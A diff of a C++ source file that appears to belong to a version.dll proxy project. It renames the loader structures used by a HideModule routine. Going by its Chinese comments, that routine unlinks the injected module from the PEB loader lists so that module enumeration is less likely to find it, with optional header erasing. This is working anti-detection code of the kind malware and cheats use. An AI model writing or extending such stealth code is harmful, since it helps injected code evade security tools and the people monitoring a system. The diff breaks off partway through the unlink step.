@@ -7,26 +7,24 @@
 
 #include "version_exports.h"
 
-// LDR 断链与抹头（可选）支持。
-typedef struct _PEB_LDR_DATA {
+// LDR 断链与抹头（可选）支持，使用私有结构以规避 SDK 结构差异。
+typedef struct _PEB_LDR_DATA_PRIVATE {
 	ULONG Length;
 	BOOLEAN Initialized;
 	PVOID SsHandle;
 	LIST_ENTRY InLoadOrderModuleList;
 	LIST_ENTRY InMemoryOrderModuleList;
 	LIST_ENTRY InInitializationOrderModuleList;
-} PEB_LDR_DATA, *PPEB_LDR_DATA;
+} PEB_LDR_DATA_PRIVATE, *PPEB_LDR_DATA_PRIVATE;
 
-typedef struct _LDR_DATA_TABLE_ENTRY {
+typedef struct _LDR_DATA_TABLE_ENTRY_PRIVATE {
 	LIST_ENTRY InLoadOrderLinks;
 	LIST_ENTRY InMemoryOrderLinks;
 	LIST_ENTRY InInitializationOrderLinks;
 	PVOID DllBase;
 	PVOID EntryPoint;
 	ULONG SizeOfImage;
-	UNICODE_STRING FullDllName;
-	UNICODE_STRING BaseDllName;
-} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
+} LDR_DATA_TABLE_ENTRY_PRIVATE, *PLDR_DATA_TABLE_ENTRY_PRIVATE;
 
 static const LONG kHideModuleResultNotAttempted = -1;
 static const LONG kHideModuleResultOk = 0;
@@ -34,19 +32,19 @@ static const LONG kHideModuleResultLdrMissing = 1;
 static const LONG kHideModuleResultNotFound = 2;
 static volatile LONG g_hide_module_result = kHideModuleResultNotAttempted;
 
-static PPEB_LDR_DATA GetPebLdr() {
+static PPEB_LDR_DATA_PRIVATE GetPebLdr() {
 #ifdef _WIN64
 	PBYTE peb = reinterpret_cast<PBYTE>(__readgsqword(0x60));
 	if (peb == NULL) {
 		return NULL;
 	}
-	return reinterpret_cast<PPEB_LDR_DATA>(*(reinterpret_cast<PVOID*>(peb + 0x18)));
+	return reinterpret_cast<PPEB_LDR_DATA_PRIVATE>(*(reinterpret_cast<PVOID*>(peb + 0x18)));
 #else
 	PBYTE peb = reinterpret_cast<PBYTE>(__readfsdword(0x30));
 	if (peb == NULL) {
 		return NULL;
 	}
-	return reinterpret_cast<PPEB_LDR_DATA>(*(reinterpret_cast<PVOID*>(peb + 0x0C)));
+	return reinterpret_cast<PPEB_LDR_DATA_PRIVATE>(*(reinterpret_cast<PVOID*>(peb + 0x0C)));
 #endif
 }
 
@@ -54,13 +52,13 @@ static LONG HideModule(HMODULE module) {
 	if (module == NULL) {
 		return kHideModuleResultNotFound;
 	}
-	PPEB_LDR_DATA ldr = GetPebLdr();
+	PPEB_LDR_DATA_PRIVATE ldr = GetPebLdr();
 	if (ldr == NULL) {
 		return kHideModuleResultLdrMissing;
 	}
 	LIST_ENTRY* head = &ldr->InLoadOrderModuleList;
 	for (LIST_ENTRY* entry = head->Flink; entry != head; entry = entry->Flink) {
-		PLDR_DATA_TABLE_ENTRY data = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
+		PLDR_DATA_TABLE_ENTRY_PRIVATE data = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY_PRIVATE, InLoadOrderLinks);
 		if (data->DllBase == module) {
 			// 将自身从三条链表中断开，降低被模块枚举发现的概率。
 			data->InLoadOrderLinks.Blink->Flink = data->InLoadOrderLinks.Flink;
